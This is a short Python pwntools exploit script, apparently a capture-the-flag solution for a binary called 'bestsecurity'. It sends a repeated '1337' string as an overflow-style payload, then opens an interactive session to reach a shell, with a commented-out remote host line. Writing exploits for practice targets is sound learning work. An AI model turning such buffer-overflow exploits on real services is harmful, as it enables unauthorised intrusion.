from binascii import unhexlify
from pwn import *

PROGRAM_NAME = "bestsec"
ENCODING = "ascii"
REMOTE = 0
OFFSET = 16


def io_beg():
	return process('./bestsecurity')
	#remote('plzpwn.me', 2002)
	#process('./jump')
	
def io_rdy(x):
	return x.recvuntil("AAAAw, yeah...".encode(ENCODING), timeout = 10).decode(ENCODING)

def main():
	stage = 0
	fin = 0
	
	while(fin < 1):
		if(stage == 0):
			io = io_beg()
			io_rdy(io)
			payload = "1337"*9
			io.sendline(payload.encode(ENCODING))
			#print io.recvuntil("calm down.")
			#io.sendline("ls")
			io.interactive()

		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()
